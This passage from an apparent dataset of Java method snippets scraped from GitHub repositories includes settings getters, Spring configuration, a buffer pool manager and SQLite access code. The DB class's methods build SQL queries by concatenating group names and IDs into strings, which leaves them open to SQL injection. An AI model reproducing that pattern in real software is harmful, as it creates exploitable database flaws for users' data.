getDefault(diagnosticSeverity, DiagnosticSeverity.Information);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34208, "method_name": "getDictionary", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getDictionary() {\n    return getDefault(dictionary, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34209, "method_name": "getDisabledRules", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getDisabledRules() {\n    return getDefault(disabledRules, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34210, "method_name": "getEnabledRules", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getEnabledRules() {\n    return getDefault(enabledRules, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34211, "method_name": "getDummyCommandPrototypes", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getDummyCommandPrototypes() {\n    return getDefault(dummyCommandPrototypes, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34212, "method_name": "getIgnoreCommandPrototypes", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getIgnoreCommandPrototypes() {\n    return getDefault(ignoreCommandPrototypes, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34213, "method_name": "getIgnoreEnvironments", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getIgnoreEnvironments() {\n    return getDefault(ignoreEnvironments, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34214, "method_name": "getDummyMarkdownNodeTypes", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getDummyMarkdownNodeTypes() {\n    return getDefault(dummyMarkdownNodeTypes, Arrays.asList(\n        \"AutoLink\", \"Code\"));\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34215, "method_name": "getIgnoreMarkdownNodeTypes", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "  public List<String> getIgnoreMarkdownNodeTypes() {\n    return getDefault(ignoreMarkdownNodeTypes, Arrays.asList(\n        \"CodeBlock\", \"FencedCodeBlock\", \"IndentedCodeBlock\"));\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34216, "method_name": "getIgnoreRuleSentencePairs", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<IgnoreRuleSentencePair>", "snippet": "  public List<IgnoreRuleSentencePair> getIgnoreRuleSentencePairs() {\n    return getDefault(ignoreRuleSentencePairs, Collections.emptyList());\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34217, "method_name": "getMotherTongueShortCode", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getMotherTongueShortCode() {\n    return getDefault(motherTongueShortCode, null);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34218, "method_name": "getLanguageModelRulesDirectory", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLanguageModelRulesDirectory() {\n    return getDefault(languageModelRulesDirectory, null);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34219, "method_name": "getNeuralNetworkModelRulesDirectory", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getNeuralNetworkModelRulesDirectory() {\n    return getDefault(neuralNetworkModelRulesDirectory, null);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34220, "method_name": "getWord2VecModelRulesDirectory", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getWord2VecModelRulesDirectory() {\n    return getDefault(word2VecModelRulesDirectory, null);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34221, "method_name": "getInitialJavaHeapSize", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getInitialJavaHeapSize() {\n    return getDefault(initialJavaHeapSize, null);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34222, "method_name": "getMaximumJavaHeapSize", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getMaximumJavaHeapSize() {\n    return getDefault(maximumJavaHeapSize, null);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34223, "method_name": "getSentenceCacheSize", "class_name": "Settings", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getSentenceCacheSize() {\n    return getDefault(sentenceCacheSize, 2000);\n  }", "url": "https://raw.githubusercontent.com/valentjn/ltex-ls-old/master/src/main/java/org/bsplines/languagetool_languageserver/Settings.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34224, "method_name": "templateEngine", "class_name": "ConfiguracaoSpringMvc", "params": ["SpringResourceTemplateResolver"], "throws": null, "modifiers": ["public"], "return_type": "SpringTemplateEngine", "snippet": "    public SpringTemplateEngine templateEngine(SpringResourceTemplateResolver resolver) {\n        SpringTemplateEngine templateEngine = new SpringTemplateEngine();\n        templateEngine.setTemplateResolver(resolver);\n        return templateEngine;\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/config/ConfiguracaoSpringMvc.java", "stars": "2", "class_props": {"extends": "WebMvcConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 34225, "method_name": "addViewControllers", "class_name": "ConfiguracaoSpringMvc", "params": ["ViewControllerRegistry"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addViewControllers(ViewControllerRegistry registry) {\n        registry.addViewController(\"/\").setViewName(\"home\");\n        registry.addViewController(\"/home\").setViewName(\"home\");\n    }", "url": "https://raw.githubusercontent.com/bonamigor/gera_notas/master/src/main/java/br/com/geranotas/config/ConfiguracaoSpringMvc.java", "stars": "2", "class_props": {"extends": "WebMvcConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 34226, "method_name": "setCc", "class_name": "TentativaPagamento", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCc(String cc) {\n\t\tthis.cc = cc;\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/TentativaPagamento.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34227, "method_name": "getTipoPagamento", "class_name": "TentativaPagamento", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TipoPagamento", "snippet": "\tpublic TipoPagamento getTipoPagamento() {\n\t\treturn tipoPagamento;\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/TentativaPagamento.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34228, "method_name": "toString", "class_name": "TentativaPagamento", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\n\t\treturn \"TentativaPagamento [tipoPagamento=\" + tipoPagamento\n\t\t\t\t+ \", restaurante=\" + restaurante + \", valor=\" + valor\n\t\t\t\t+ \", countryCode=\" + countryCode + \", usuario=\" + usuario\n\t\t\t\t+ \", cc=\" + cc + \"]\";\n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/TentativaPagamento.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34229, "method_name": "getDoors2", "class_name": "Vehicle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<T>", "snippet": "  public List<T> getDoors2() {\n    return doors2;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/simplelistparameter/Vehicle.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34230, "method_name": "setDoors2", "class_name": "Vehicle", "params": ["List<T>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDoors2(List<T> doors2) {\n    this.doors2 = doors2;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/simplelistparameter/Vehicle.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34231, "method_name": "onDraw", "class_name": "Practice3DrawRectView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n//        \u7ec3\u4e60\u5185\u5bb9\uff1a\u4f7f\u7528 canvas.drawRect() \u65b9\u6cd5\u753b\u77e9\u5f62\n        canvas.drawRect(100, 100, 400, 300, paint);\n\n\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson1/Practice3DrawRectView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 34232, "method_name": "fetchPageImpl", "class_name": "BufferPoolManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Page", "snippet": "    public Page fetchPageImpl(int pageId) {\n\n        if (map.containsKey(pageId)) {\n            clockReplacer.pin(map.get(pageId));\n            freeList.remove(map.get(pageId));\n            return pages[map.get(pageId)];\n        }\n        int frameId;\n        if (!freeList.isEmpty()) {\n            frameId = freeList.pollFirst();\n        } else {\n            frameId = clockReplacer.victim();\n\n            if (frameId == -1) {\n                return null;\n            }\n            if (pages[frameId].isDirty()) {\n                flushPageImpl(pages[frameId].getPageId());\n            }\n            map.remove(pageId);\n        }\n        map.put(pageId, frameId);\n        Page page = new Page();\n        page.setPageId(pageId);\n        page.setPinCount(1);\n        page.setDirty(false);\n        byte[] data = new byte[PAGE_SIZE];\n        diskManager.readPage(pageId, data);\n        page.setData(data);\n        pages[frameId] = page;\n        return page;\n    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/buffer/BufferPoolManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34233, "method_name": "unpinPageImpl", "class_name": "BufferPoolManager", "params": ["int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean unpinPageImpl(int pageId, boolean isDirty) {\n\n        if (map.containsKey(pageId)) {\n\n            if (pages[map.get(pageId)].getPinCount() <= 0) {\n                return false;\n            }\n            pages[map.get(pageId)].setDirty(pages[map.get(pageId)].isDirty() || isDirty);\n            pages[map.get(pageId)].setPinCount(pages[map.get(pageId)].getPinCount() - 1);\n            if (pages[map.get(pageId)].getPinCount() == 0) {\n                clockReplacer.unpin(map.get(pageId));\n            }\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/buffer/BufferPoolManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34234, "method_name": "flushPageImpl", "class_name": "BufferPoolManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean flushPageImpl(int pageId) {\n        if (map.containsKey(pageId) && pages[map.get(pageId)].isDirty()) {\n            pages[map.get(pageId)].setDirty(false);\n            diskManager.writePage(pageId, pages[map.get(pageId)].getData());\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/buffer/BufferPoolManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34235, "method_name": "newPageImpl", "class_name": "BufferPoolManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Page", "snippet": "    public Page newPageImpl() {\n\n        int frameId;\n        if (!freeList.isEmpty()) {\n            frameId = freeList.pollFirst();\n\n        } else {\n            frameId = clockReplacer.victim();\n            if (frameId == -1) {\n                return null;\n            }\n            if (pages[frameId].isDirty()) {\n                flushPageImpl(pages[frameId].getPageId());\n            }\n            map.remove(pages[frameId].getPageId());\n        }\n        int pageId = diskManager.allocatePage();\n        map.put(pageId, frameId);\n        Page page = new Page();\n        page.setPageId(pageId);\n        page.setPinCount(1);\n        page.setDirty(false);\n        pages[frameId] = page;\n        return page;\n    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/buffer/BufferPoolManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34236, "method_name": "deletePageImpl", "class_name": "BufferPoolManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean deletePageImpl(int pageId) {\n        diskManager.deallocatePage(pageId);\n        if (map.containsKey(pageId)) {\n            if (pages[map.get(pageId)].getPinCount() > 0) {\n                return false;\n            }\n            pages[pageId] = null;\n            freeList.add(map.get(pageId));\n            map.remove(pageId);\n        }\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/buffer/BufferPoolManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34237, "method_name": "flushAllPagesImpl", "class_name": "BufferPoolManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void flushAllPagesImpl() {\n        for (Integer integer : map.keySet()) {\n            flushPageImpl(integer);\n        }\n    }", "url": "https://raw.githubusercontent.com/CNYuYang/BusTub/master/src/main/java/run/yuyang/db/buffer/BufferPoolManager.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34238, "method_name": "addInterceptors", "class_name": "WebConfiguration", "params": ["InterceptorRegistry"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addInterceptors(InterceptorRegistry registry) {\n        LocaleChangeInterceptor localeInterceptor = new LocaleChangeInterceptor();\n        localeInterceptor.setParamName(\"lang\");\n        registry.addInterceptor(localeInterceptor);\n    }", "url": "https://raw.githubusercontent.com/jiangvin/webtank/master/util/src/main/java/com/integration/util/configuration/WebConfiguration.java", "stars": "2", "class_props": {"extends": null, "implements": ["WebMvcConfigurer"], "modifiers": ["public"]}}, {"id": 34239, "method_name": "getInstance", "class_name": "DB", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "DB", "snippet": "    public static DB getInstance(){\n        return Instance;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34240, "method_name": "init", "class_name": "DB", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        try {\n            h= new SqliteHelper(\"root.db\");\n            String initTable=\"CREATE TABLE if not exists _group(\\n\" +\n                    \"                       id integer PRIMARY KEY AUTOINCREMENT,\\n\" +\n                    \"                       groupid varchar(20),\\n\" +//\u5de5\u4f1a\u6240\u5728qq\u7fa4\n                    \"                       groupName varchar(20),\\n\" +//\u5de5\u4f1a\u540d\n                    \"                       groupMasterQQ varchar(20),\\n\" +//\u4f1a\u957fqq\n                    \"                       createDate varchar(8)\\n\" + //\u5de5\u4f1a\u521b\u5efa\u65f6\u95f4\n                    \"                    );\\n\" +\n                    \"                    CREATE TABLE if not exists teamMember(\\n\" +\n                    \"                       userQQ varchar(20),\\n\" + //qq\u53f7\n                    \"                       id integer,\\n\" + //\u6240\u5c5e\u5de5\u4f1a\u4e3b\u952e\n                    \"                      name varchar(20),\\n\" + //\u6635\u79f0\n                    \"                       power boolean\\n\" +//1 \u7ba1\u7406\u5458\n                    \"                       );\\n\" +\n                    \"                    CREATE TABLE if not exists knife(\\n\" +\n                    \"                       knifeQQ varchar(20),\\n\" +//\u51fa\u5200\u4ebaqq\n                    \"                       no integer,\\n\" +  //\u5468\u76ee+\u51e0\u738b\n                    \"                       hurt integer,\\n\" + //\u4f24\u5bb3\n                    \"                       date varchar(8),\\n\" +//\u65f6\u95f4\n                    \"                       complete boolean\\n\" +//\u662f\u5426\u662f\u5b8c\u6574\u4e00\u5200\uff08\u6253\u7206boss\u7684\u5200\u4e0d\u7b97\u5b8c\u6574\u4e00\u5200\n                    \"                       );\\n\" +\n                    \"                    CREATE TABLE if not exists tree(\\n\" +\n                    \"                       userId varchar(20),\\n\" +\n                    \"                       date varchar(8),\\n\" +\n                    \"                       isTree boolean);\\n\" +\n                    \"CREATE TABLE if not exists progress(\\n\" +\n                    \"                       groupid varchar(20), \\n\" +//\u5de5\u4f1aqq\n                    \"                        id int, \\n\" +//\u5de5\u4f1a\u4e3b\u952e\n                    \"                       loop int , \\n\" +//\u5468\u76ee\n                    \"                       serial int, \\n\" +//\u51e0\u738b\n                    \"                       Remnant int \\n\" +//\u5269\u4f59\u8840\u91cf\n                    \"                    );\" +\n                    \" ALTER TABLE progress ADD COLUMN startTime varchar(8);\" +//\u4f1a\u6218\u5f00\u59cb\u65f6\u95f4\n                    \" ALTER TABLE progress ADD COLUMN endTime varchar(8);\"//\u4f1a\u6218\u7ed3\u675f\u65f6\u95f4\n                    ;\n            h.executeUpdate(initTable);\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (SQLException e) {\n\n        }\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34241, "method_name": "clearTree", "class_name": "DB", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,List>", "snippet": "    public Map<String, List<String>> clearTree(List<Integer> Group) {\n        String clearTree = \"delete from tree join teamMember on teamMember.userQQ=tree.userId where teamMember.id=\";\n        Map<String, List<String>> map = new HashMap<>();\n        String clearMembers = \"select userId from tree join teamMember on teamMember.userQQ=tree.userId where teamMember.id=\";\n        String selectGroupName = \"select groupid from _group where id=\";\n        RowMapper<String> GroupQQs = (rs, index) -> rs.getString(\"groupid\");\n        RowMapper<String> Members = (rs, index) -> rs.getString(\"userId\");\n        for (int groupID : Group) {\n            try {\n                map.put(h.executeQuery(selectGroupName + groupID, GroupQQs).get(0), h.executeQuery(clearMembers + groupID, Members));\n                h.executeUpdate(clearTree + groupID);\n            } catch (SQLException e) {\n                e.printStackTrace();\n            } catch (ClassNotFoundException e) {\n                e.printStackTrace();\n            } catch (IndexOutOfBoundsException e) {\n                //\u8fd9\uff0c\u6709\u4e3b\u952e\u4e3a\u4ec0\u4e48\u8fd8\u627e\u4e0d\u7740\u2026\u2026\u2026\u2026\n            }\n        }\n        return map;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34242, "method_name": "searchDeadLineGroup", "class_name": "DB", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "    public List<Integer> searchDeadLineGroup() {\n        String time = new SimpleDateFormat(dateFormat).format(new Date());//\u73b0\u5728\u65f6\u95f4\n        String sql = \"select id from progress where endTime<=\\\"\" + time + \"\\\"\";\n        RowMapper<Integer> rowMapper = (rs, index) -> rs.getInt(\"id\");\n        List<Integer> list = null;\n        try {\n            list = h.executeQuery(sql, rowMapper);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return list;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34243, "method_name": "searchAllGroupOnProgress", "class_name": "DB", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "    public List<Integer> searchAllGroupOnProgress() {\n        String time = new SimpleDateFormat(dateFormat).format(new Date());//\u73b0\u5728\u65f6\u95f4\n        String sql = \"select id from progress  where startTime<=\\\"\" + time + \"\\\" and endTime>\\\"\" + time + \"\\\"\";\n        RowMapper<Integer> rowMapper = (rs, index) -> rs.getInt(\"id\");\n        List<Integer> list = null;\n        try {\n            list = h.executeQuery(sql, rowMapper);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return list;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34244, "method_name": "deleteDeadLineGroup", "class_name": "DB", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteDeadLineGroup(List<Integer> groupid) {\n        String sql = \"delete from progress where id=\";\n\n        for (int i : groupid) {\n            try {\n                h.executeUpdate(sql + i);\n            } catch (SQLException e) {\n                e.printStackTrace();\n            } catch (ClassNotFoundException e) {\n                e.printStackTrace();\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34245, "method_name": "searchOutTimeTree", "class_name": "DB", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> searchOutTimeTree() {\n        String time = new SimpleDateFormat(dateFormat).format(new Date());//\u73b0\u5728\u65f6\u95f4\n        Date date = new Date();\n        LocalDateTime localDateTime = LocalDateTime.now();\n        DateTimeFormatter dateTimeFormatter = DateTimeFormatter.ofPattern(\"yy:MM:dd\");\n        List<String> QQs = null;\n        if (localDateTime.getHour() < knifeFrash) { //5\u70b9\u524d\u4e0d\u8bb8\u4e0d\u8bb8\u5237\u65b0\n            localDateTime = localDateTime.plusDays(-1);\n        }\n        SimpleDateFormat df = new SimpleDateFormat(dateFormat);//\u8bbe\u7f6e\u65e5\u671f\u683c\u5f0f\n        String sql = \"select userId from tree where date=\\\"\" + localDateTime.format(dateTimeFormatter) + \"\\\"\";\n        RowMapper<String> rowMapper = (rs, index) -> rs.getString(\"userId\");\n\n        try {\n            QQs = h.executeQuery(sql, rowMapper);\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n\n        return QQs;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34246, "method_name": "clearTree", "class_name": "DB", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,List>", "snippet": "    public Map<String, List<String>> clearTree() {\n        String sql;\n        Date date =new  Date();\n        LocalDateTime localDateTime =LocalDateTime.now();\n        HashMap<String, List<String>> map = new HashMap<>();\n        if(localDateTime.getHour()<knifeFrash){\n            localDateTime=localDateTime.plusDays(-1);\n        }\n        SimpleDateFormat df = new SimpleDateFormat(dateFormat);//\u8bbe\u7f6e\u65e5\u671f\u683c\u5f0f\n        sql=\"select userId groupid from tree, _group,teamMember where teamMember.id=_group.id and tree.userId=teamMember.userQQ and date<\\\"\"+df.format(date)+\"\\\"\";\n        try {\n            RowMapper<String[]>  rowMapper=new RowMapper<String[]>() {\n                @Override\n                public String[] mapRow(ResultSet rs, int index) throws SQLException {\n                    String[] strings=new String[2];\n                    strings[0]= rs.getString(\"userId\");\n                    strings[1]= rs.getString(\"groupid\");\n                    return strings;\n                }\n            };\n            ArrayList<String[]> strings=(ArrayList<String[]>)h.executeQuery(sql,rowMapper);\n            if(strings!=null) {  //\u6709\u4eba\u6302\u6811\n                sql = \"delete from tree where date<\\\"\" + df.format(date) + \"\\\"\";\n                h.executeUpdate(sql);//\u5220\u4e86\u6811\n                for(String[] strings1:strings){\n                    try {\n                        map.get(strings1[1]).add(strings1[0]);\n                    }catch (NullPointerException e){\n                        LinkedList<String> linkedList=new LinkedList<String>();\n                        linkedList.add(strings1[0]);\n                        map.put(strings1[1],linkedList);\n                    }\n                }\n            }\n        } catch (SQLiteException exceptione){\n\n        } catch (SQLException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        }\n        return map;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34247, "method_name": "creatGroup", "class_name": "DB", "params": ["Group", "String"], "throws": null, "modifiers": ["public", "synchronized"], "return_type": "int", "snippet": "    public synchronized int  creatGroup(Group group,String masterName){\n        String sql=\"select name from teamMember where userQQ=\"+group.getGroupMasterQQ();\n        RowMapper<Integer> rowMapper= (rs, index) -> rs.getInt(\"id\");\n        try {\n            String i=h.executeQuery(sql,String.class);\n            return 0;//\u5df2\u7ecf\u6709\u4e00\u4e2a\u793e\u56e2\u4e86\n        } catch (SQLException e) {\n            //\u6ca1\u6709\u627e\u5230\n            String sql1=\"insert into _group values(null,\\\"\"+group.getGroupid()+\"\\\",\\\"\"+group.getGroupName()+\"\\\",\\\"\"+group.getGroupMasterQQ()+\"\\\",\\\"\"+group.getCreateDate()+\"\\\")\";\n            try {\n                h.executeUpdate(sql1);\n                sql1=\"select id from _group where groupid=\\\"\"+group.getGroupid()+\"\\\"\";\n                int i=h.executeQuery(sql1,rowMapper).get(0);\n                teamMember teamMember=new teamMember(group.getGroupMasterQQ(),true,i, masterName);\n                //\u628a\u56e2\u957f\u52a0\u8fdb\u53bb\uff0c\u9ed8\u8ba4\u521b\u7684\u4eba\u662f\u56e2\u957f\n                if (joinGroup(teamMember, group.getGroupName()) == 0) {\n                    return 0;//\u5df2\u7ecf\u6709\u4e00\u4e2a\u793e\u56e2\u4e86\n                }\n                return 1;//\u521b\u5efa\u6210\u529f\n            } catch (SQLException e1) {\n                e1.printStackTrace();\n            } catch (ClassNotFoundException e1) {\n                e1.printStackTrace();\n            }\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        } catch (InstantiationException e) {\n            e.printStackTrace();\n        }catch (NullPointerException e){\n            e.printStackTrace();\n        }\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/DB.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 